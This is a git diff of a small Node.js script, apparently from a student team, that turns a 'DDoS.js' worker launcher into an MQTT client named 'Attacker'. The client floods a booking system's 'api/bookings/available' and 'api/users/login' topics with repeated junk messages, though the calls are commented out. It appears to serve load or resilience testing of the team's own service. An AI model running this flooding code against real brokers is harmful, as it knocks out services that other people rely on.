@@ -1,23 +1,50 @@
-const { Worker } = require("worker_threads");
+require("dotenv").config();
+const mqtt = require("mqtt");
 
-function runService(workerData) {
-  return new Promise((resolve, reject) => {
-    const worker = new Worker("./DDoS.js", { workerData });
-    worker.on("message", resolve);
-    worker.on("error", reject);
-    worker.on("exit", (code) => {
-      if (code !== 0)
-        reject(
-          new Error(`Stopped the Worker Thread with the exit code: ${code}`)
-        );
-    });
-  });
-}
+const client = mqtt.connect({
+  clientId: `Attacker`,
+  hostname: process.env.BROKER_URI,
+  username: process.env.BROKER_USERNAME,
+  password: process.env.BROKER_PASSWORD,
+  protocol: "wss",
+});
 
-async function run(n) {
-  const result = await runService(`DDoS Attacker #${n}`);
-  console.log(result);
-}
+const DDoS_Bookings = (n, timeout) => {
+  for (let i = 0; i < n + 1; i++) {
+    setInterval(() => {
+      const msg = {
+        "T34m-S1xt33n": "ROFL",
+      };
+      client.publish("api/bookings/available", JSON.stringify(msg));
+    }, timeout);
+  }
+};
+
+const DDoS_Users = (n, timeout) => {
+  for (let i = 0; i < n + 1; i++) {
+    setInterval(() => {
+      const msg = {
+        "T34m-S1xt33n": "ROFL",
+      };
+      client.publish("api/users/login", JSON.stringify(msg));
+    }, timeout);
+  }
+};
 
 
-run(1).catch((err) => console.error(err));
+
+client.on("connect", () => {
+  console.log("connected!")
+  client.subscribe("api/gateway/#")
+})
+
+client.on("message", (t, m) => {
+  const msg = JSON.parse(m.toString());
+  console.log(msg)
+})
+
+const bursts = 10; // number of messages to send in close to one go
+const interval = 100; // time between bursts in ms
+
+//DDoS_Bookings(bursts, interval)
+//DDoS_Users(bursts, interval)
